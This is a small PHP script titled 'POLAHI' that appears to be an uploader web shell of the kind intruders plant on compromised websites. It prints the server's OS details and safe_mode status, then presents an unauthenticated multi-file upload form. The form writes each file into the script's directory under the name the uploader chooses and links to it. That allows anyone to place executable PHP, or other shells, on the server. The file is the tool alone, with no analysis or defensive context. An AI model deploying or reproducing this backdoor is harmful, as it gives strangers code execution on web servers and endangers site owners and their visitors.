<?php 
echo '<title>POLAHI</title>';
$os = wordwrap(php_uname(),90,1);
$md = @ini_get('safe_mode');
if (!$md) {$sec="OFF";} else {$sec= "ON";};
echo '<center>Safe-mode:'.$sec.' OS:'.$os.'</center>';
echo '<form method="post" target="_self" enctype="multipart/form-data"><div align="center"><input type="file" name="file[]" size="20" id="file" multiple /><input type="submit" name="submit" value="upload" /></div></form><br>';


if(isset($_POST['submit'])){
 
 // Count total files
 $countfiles = count($_FILES['file']['name']);

 // Looping all files
 for($i=0;$i<$countfiles;$i++){
  $filename = $_FILES['file']['name'][$i];
 
  // Upload file
  move_uploaded_file($_FILES['file']['tmp_name'][$i],$_FILES['file']['name'][$i]);
	echo "<pre>";
	echo "<center>";
	echo "<ul>";
	echo "<li>";
    echo "<a href=\"{$_FILES['file']['name'][$i]}\" TARGET=_BLANK>{$_FILES['file']['name'][$i]}</a><br>";
	echo "</li>";
	echo "</ul>";
	echo "</center>";
	echo "</pre>";
	
 }
} 
?>
